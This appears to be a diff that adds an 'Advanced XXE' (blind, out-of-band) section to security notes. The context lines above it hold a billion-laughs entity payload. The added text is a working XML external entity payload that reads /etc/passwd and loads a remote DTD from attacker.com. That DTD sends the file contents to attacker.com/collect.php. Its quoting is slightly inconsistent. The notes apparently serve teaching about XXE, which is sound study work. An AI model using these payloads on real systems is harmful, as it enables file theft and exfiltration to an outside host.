@@ -130,5 +130,21 @@ This is Vulnerability
 <tag>&lol9;</tag>
 
 
+ ## Advanced XXE 
+ 
+ 1.Also Known as Blind XXE 
+ 2.Out of band data exfiltration 
+ 
+ The Payload to Upload/Send
+ 
+     <!DOCTYPE roottag [
+     <!ENTITY % file SYSTEM "file:///etc/passwd">
+     <!ENTITY % dtd SYSTEM "http://attacker.com/host.dtd">
+     %dtd;]>
+     <roottag>&send;</roottag>
+     
+     Content of host.dtd
+     <!ENTITY % all "<!ENTITY send SYSTEM "http://attacker.com/collect.php?file=%file;'>">
+     %all;
  
  
